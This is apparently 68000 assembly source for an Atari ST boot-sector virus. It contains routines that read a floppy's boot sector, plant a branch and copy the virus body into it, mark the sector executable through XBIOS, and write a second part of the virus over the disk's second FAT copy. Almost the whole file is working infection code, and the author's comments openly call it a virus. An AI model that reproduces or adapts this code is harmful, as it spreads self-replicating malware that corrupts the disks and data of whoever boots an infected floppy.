; ==========================================================
;
; READ/WRITE MORE SECTORS
;
; this routine overwrites 2nd FAT.
; max size of extra virus body: 5*$200
;
; INPUT:
; A0.l = &(buffer) for extra virus body
; D0.w = drive A: or B:
; D5.w = read ($08) or write ($09)
;
; OUTPUT:
; D0.l = success or failure
;
; ==========================================================


; it seemed simpler to have all modules requesting this to funnel
; through here. this way they're only concerned with "read more sectors".
; this routine handles the particulars of making that happen.

; perhaps i may find other areas on the disk. someday i'll learn how to mark bad sectors in the FAT.
; rather than update each and every copy of this code, i'd only have to update here :-)

rw_more_code:
	movem.l	d1-d7/a0-a6,-(a7)
	; a0 = &(buffer)
	; d0 = dev #
	move.w #1,d1	; rw 1 sector
	move.w #0,d2	; side 0
	move.w #0,d3	; track 0
	move.w #6,d4	; sector 6
	; d5 = read/write op
	bsr flop_io_EX
	movem.l	(a7)+,d1-d7/a0-a6
	rts
END_rw_more_code:	
	
	
; ==========================================================
;     EXTENDED FLOPPY IO
;
; allows access to any CHS on the disk
;
; INPUTS:
; A0.l = &(buffer) will hold extra code
; D0.w = drive A: or B:
; D1.w = num sectors
; D2.w = side
; D3.w = track
; D4.w = sector
; D5.w = read/write ($08) or ($09)
;
; OUTPUT:
; D0 = success or failure
;
; end of bootsector: $1FD
;
; ==========================================================

flop_io_EX:
	movem.l	d1-d7/a0-a6,-(a7)
        move.w	 d1,-(sp)	; num sectors
	move.w   d2,-(sp)	; side 0 or 1
	move.w   d3,-(sp)	; track #
	move.w   d4,-(sp)	; sector
	move.w   d0,-(sp)	; drive A: or B:
	clr.l       -(sp)	; never used
	move.l	 a0,-(sp)	; buffer
	move.w   d5,-(sp)	; floprd() ($08) OR flopwr() ($09)
	trap   #14
	lea   20(sp),sp
	movem.l	(a7)+,d1-d7/a0-a6
	rts
END_flop_io_EX:


; ========================================================
;    INFECT BOOTSECTOR
;
; INPUT: D0 = dev
;	 A0 = dest buffer
;	 A2 = src buff
; OUTPUT: D0 = success or failure
;
; ========================================================
_buff		EQU	-4  ; .l
_srcbuff	EQU	-8  ; .l
_dev		EQU	-10  ; .w

infect_BOOT:
		link	a6,#-6
		movem.l	d1-d7/a0-a5,-(a7)
	
	save_dev:
		lea.l	_dev(a6),a1
		move.w	d0,(a1)
		
	save_buff:
		lea.l	_buff(a6),a1
		move.l	a0,(a1)
		
	save_srcbuff:
		lea.l	_srcbuff(a6),a1
		move.l	a2,(a1)	
		
	read_victim:
		; D0.w = dev
		; D1.w = floprd() OR flopwr() ; ($08) OR ($09)
		; A0.l = dest addr
		
		moveq.w	#$08,d1
		bsr	flop_io
		cmpi	#0,d0
		bne	exit_infect_BOOT
			
	plant_bra:
		move.l _buff(a6),a0
		move.w	#$601C,(a0)
	
	copy_virus:
		move.l	a2,a1
		add	#$1E,a0
		move	#(VIRLEN),d0

	cpy_lp:
		move.b	(a1)+,(a0)+
		dbf	d0,cpy_lp

; perhaps i should've made this a seperate sub. however it's very simple and only called once.
; had i implemented modularity from the start, this would've been..
		
	make_exec:
		move.w   #$1,-(sp)		; executable
		move.w   #-1,-(sp)		; type don't change
		move.l   #-1,-(sp)		; serial don't change
		move.l	 _buff(a6),-(sp)	; bootsector
		move.w   #$12,-(sp)
		trap	 #14
		lea	 14(sp),sp
		
	plant_virus:
		clr.l	d0
		move.l	_buff(a6),a0
		move.w	_dev(a6),d0
		moveq.w	#$09,d1
		bsr	flop_io
			
	plant_rest_of_virus:

;; must nop out checksum bytes.
		move.l	_srcbuff(a6),a0		; starts at a2b.s: _main
		lea	-$01E(a0),a0		; now a2b.s: _entry
		lea	$1FE(a0),a0
		move.w	#$4E71,(a0)

;; now we plant P2 of the virus	
		lea	2(a0),a0	; A0 = -> next sector to write
		move.w	_dev(a6),d0
		move.w	#$09,d5		; flopwr()
		bsr	rw_more_code
		
exit_infect_BOOT:
		movem.l	(a7)+,d1-d7/a0-a5
		unlk a6
        	rts



; ==========================================================
;     FLOPPY BOOTSECTOR IO
;
; INPUT: a0.l = buffer
;	 d0.w = dev
;	 d1.w = flopwr OR floprd
; OUTPUT: D0 = success or failure
;
; future mod: considering making this an interface
; to flop_io_EX 
;
; ========================================================

	EVEN
	DCB.w     24,$4E71
        	
flop_io:
	movem.l	d1-d7/a0-a6,-(a7)
        move.w	 #$1,-(sp)	; read 1 sector
	move.w   #$0,-(sp)	; side 0
	move.w   #$0,-(sp)	; track 0
	move.w   #$1,-(sp)	; bootsector
	move.w   d0,-(sp)	; drive A: or B:
	move.l   #$0,-(sp)	; never used
	move.l	 a0,-(sp)	; buffer
	move.w   d1,-(sp)	; floprd() ($08) OR flopwr() ($09)
	trap   #14
	lea   20(sp),sp
	movem.l	(a7)+,d1-d7/a0-a6
	rts
END_flop_io:


;===================================================================================
;
; CHECK BOOT FLAG
;
; DFLG will be modified by other outside code
;
; INPUTS:
; none
;
; RETURNS:
; D0 = dev number (A: = 0, B: = 1, C: = 2, etc)
; D1 = &(DFLG)
;	0 (floppy)
;      -1 (PRG)
;
;===================================================================================

check_bootflg:
	       movem.l	d2-d7/a0-a6,-(a7)
	       move.w	_bootdev,d0
	       
	       lea	DFLG(pc),a0
	       move.l	a0,d1
	       cmpi.l	#-1,(a0)
	       beq	ret_prg
	       
	  ret_flop:
	       bra.s	_end
	       
	  ret_prg:
	       move.l	#-1,(a0)
	       
	  _end:
	       movem.l	(a7)+,d2-d7/a0-a6
	       rts
	  DFLG:		dc.l	$0
END_check_bootflg: